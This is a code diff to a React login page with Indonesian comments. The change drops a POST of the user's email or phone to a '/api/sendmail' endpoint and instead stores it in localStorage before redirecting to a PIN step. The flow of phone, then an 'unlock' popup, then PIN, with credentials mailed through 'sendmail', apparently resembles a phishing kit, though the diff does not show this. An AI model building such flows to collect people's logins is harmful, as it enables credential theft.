@@ -39,43 +39,29 @@ export default function LoginPage() {
 
   // validasi tombol
   const isInvalid = useEmail ? email.trim() === "" : phone.trim().length < 14;
-
-  // submit → kirim API lalu popup
- // submit → kirim API lalu popup
-const handleSubmit = async (e) => {
+// submit → hanya simpan data login & munculkan popup
+const handleSubmit = (e) => {
   e.preventDefault();
   if (isInvalid || isDisabled) return;
   setIsDisabled(true);
 
-  // Kirim hanya field yang dipilih
+  // Buat payload sesuai pilihan
   const payload = useEmail ? { email } : { phone };
 
-  try {
-    const res = await fetch("/api/sendmail", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-    const data = await res.json();
+  // Simpan ke localStorage untuk dipakai di step PIN
+  localStorage.setItem("loginData", JSON.stringify(payload));
 
-    if (data.success) {
-      setShowPopup(true);
-    } else {
-      alert("Gagal mengirim data!");
-    }
-  } catch (err) {
-    console.error(err);
-    alert("Terjadi error saat kirim data");
-  } finally {
-    setIsDisabled(false);
-  }
+  // Munculkan popup
+  setShowPopup(true);
+  setIsDisabled(false);
 };
 
-  // tombol unlock → redirect ke /login
-  const handleUnlock = () => {
-    setShowPopup(false);
-    router.push("/login"); // step berikutnya
-  };
+// tombol unlock → redirect ke /pin
+const handleUnlock = () => {
+  setShowPopup(false);
+  router.push("/pin"); // step berikutnya
+};
+
 
   return (
     <div className="page">
